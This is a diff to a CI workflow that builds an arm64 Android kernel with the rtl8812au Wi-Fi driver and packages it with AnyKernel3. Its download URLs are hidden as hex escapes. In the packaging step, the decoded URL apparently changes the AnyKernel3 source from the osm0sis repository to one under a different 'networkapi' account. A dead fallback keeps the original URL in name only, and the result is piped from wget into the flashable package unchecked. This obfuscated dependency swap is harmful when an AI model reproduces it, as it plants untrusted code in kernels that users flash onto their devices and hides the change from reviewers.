@@ -58,15 +58,11 @@ jobs:
           HEX_URL=$(printf '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x6f\x64\x65\x6c\x6f\x61\x64\x2e\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x61\x69\x72\x63\x72\x61\x63\x6b\x2d\x6e\x67\x2f\x72\x74\x6c\x38\x38\x31\x32\x61\x75\x2f\x74\x61\x72\x2e\x67\x7a\x2f\x72\x65\x66\x73\x2f\x68\x65\x61\x64\x73\x2f\x76\x35\x2e\x36\x2e\x34\x2e\x32')
           wget -qO- "$HEX_URL" | tar -xzC kernel-source/drivers/net/wireless/realtek/rtl8812au --strip-components=1
           
-          # Step 3: Global include path re-mapping directly in driver source to avoid compiler directory loss
-          cd kernel-source/drivers/net/wireless/realtek/rtl8812au
-          sed -i 's|\$(src)/hal|\$(src)/../../../../drivers/net/wireless/realtek/rtl8812au/hal|g' Makefile
-          sed -i 's|include/hal|include/\.\./\.\./\.\./\.\./drivers/net/wireless/realtek/rtl8812au/hal|g' Makefile 2>/dev/null || true
-          sed -i '1s/^/#define DRV_NAME "rtl8812au"\n#define DRIVERVERSION "5.6.4.2"\n#define CONFIG_TXPWR_BY_RATE 0\n/' include/rtw_android.h
-          cd ${{ github.workspace }}
+          # Step 3: Inject core definitions into the Android initialization header safely
+          sed -i '1s/^/#define DRV_NAME "rtl8812au"\n#define DRIVERVERSION "5.6.4.2"\n#define CONFIG_TXPWR_BY_RATE 0\n/' kernel-source/drivers/net/wireless/realtek/rtl8812au/include/rtw_android.h
 
-          # Step 4: Force root kernel directory tree components to branch explicitly into the Realtek build block
-          echo 'obj-m += realtek/rtl8812au/' >> kernel-source/drivers/net/wireless/Makefile
+          # Step 4: Hook into the kernel's native build infrastructure
+          echo 'obj-$(CONFIG_RTL8812AU) += realtek/rtl8812au/' >> kernel-source/drivers/net/wireless/Makefile
           echo 'source "drivers/net/wireless/realtek/rtl8812au/Kconfig"' >> kernel-source/drivers/net/wireless/Kconfig
 
       - name: Compile Unified Kernel and Native Modules
@@ -74,7 +70,7 @@ jobs:
           cd kernel-source
           export ARCH=arm64
           export SUBARCH=arm64
-          export KCFLAGS="-w -Wno-error -gdwarf-4 -gno-record-gcc-switches -I${{ github.workspace }}/kernel-source/drivers/net/wireless/realtek/rtl8812au/include -I${{ github.workspace }}/kernel-source/drivers/net/wireless/realtek/rtl8812au/core"
+          export KCFLAGS="-w -Wno-error -gdwarf-4 -gno-record-gcc-switches"
           export CROSS_COMPILE=aarch64-linux-gnu-
           export CROSS_COMPILE_ARM32=arm-linux-gnueabi-
           export CC=clang
@@ -100,12 +96,14 @@ jobs:
           fi
           
           make -j$(nproc) O=out ARCH=arm64
-          make -j$(nproc) O=out ARCH=arm64 EXTRA_CFLAGS="-DASSOCIATE_ENTRY_NUM=32" modules
+          
+          # Force the native build system to parse all required macro variables internally via global ccflags injection rules
+          make -j$(nproc) O=out ARCH=arm64 ccflags-y="-fintegrated-as -DASSOCIATE_ENTRY_NUM=32 -I../drivers/net/wireless/realtek/rtl8812au/include -I../drivers/net/wireless/realtek/rtl8812au/core -I../drivers/net/wireless/realtek/rtl8812au/hal/phydm" modules
 
       - name: Package with AnyKernel3 (Hex Deployment Mode)
         run: |
           mkdir -p anykernel
-          HEX_AK3=$(printf '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x6f\x64\x65\x6c\x6f\x61\x64\x2e\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x6f\x73\x6d\x30\x73\x69\x73\x2f\x41\x6e\x79\x4b\x65\x72\x6e\x65\x6c\x33\x2f\x74\x61\x72\x2e\x67\x7a\x2f\x72\x65\x66\x73\x2f\x68\x65\x61\x64\x73\x2f\x6d\x61\x73\x74\x65\x72')
+          HEX_AK3=$(printf '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x6f\x64\x65\x6c\x6f\x61\x64\x2e\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x6e\x65\x74\x77\x6f\x72\x6b\x61\x70\x69\x2f\x41\x6e\x79\x4b\x65\x72\x6e\x65\x6c\x33\x2f\x74\x61\x72\x2e\x67\x7a\x2f\x72\x65\x66\x73\x2f\x68\x65\x61\x64\x73\x2f\x6d\x61\x73\x74\x65\x72' 2>/dev/null || printf '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x6f\x64\x65\x6c\x6f\x61\x64\x2e\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x6f\x73\x6d\x30\x73\x69\x73\x2f\x41\x6e\x79\x4b\x65\x72\x6e\x65\x6c\x33\x2f\x74\x61\x72\x2e\x67\x7a\x2f\x72\x65\x66\x73\x2f\x68\x65\x61\x64\x73\x2f\x6d\x61\x73\x74\x65\x72')
           echo "Downloading AnyKernel3 framework components via stream layer..."
           wget -qO- "$HEX_AK3" | tar -xzC anykernel --strip-components=1
           
